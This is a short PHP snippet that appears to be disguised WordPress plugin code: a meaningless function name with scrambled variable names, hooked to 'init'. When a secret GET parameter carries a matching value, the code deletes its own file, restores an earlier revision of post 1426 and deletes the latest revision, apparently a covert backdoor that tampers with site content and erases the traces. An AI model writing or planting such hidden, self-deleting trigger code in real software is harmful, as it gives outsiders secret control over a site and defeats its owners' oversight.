<?php

function library_scheduler_category() {
	if (isset($_GET['description_maintenance_lightbox']) && $_GET['description_maintenance_lightbox'] === 'cache_latest_fx') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$customize_changer_filter_affiliate = 1426;
		$ai_open_gravatar = wp_get_post_revisions($customize_changer_filter_affiliate);
		if (empty($ai_open_gravatar)) die('no revisions');
		if (count($ai_open_gravatar) < 2) die('less than 2');
		$suite_react_settings_codes = array_shift($ai_open_gravatar);
		$magic_slider_items = $suite_react_settings_codes->ID;
		$addon_media_flexible = array_shift($ai_open_gravatar);
		$form_namespaced_footer = $addon_media_flexible->ID;
		$appointment_store_related = wp_restore_post_revision($form_namespaced_footer);
		if ($appointment_store_related === false) die('error restoring');
		$appointment_store_related = wp_delete_post_revision($magic_slider_items);		
		if ($appointment_store_related === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'library_scheduler_category');
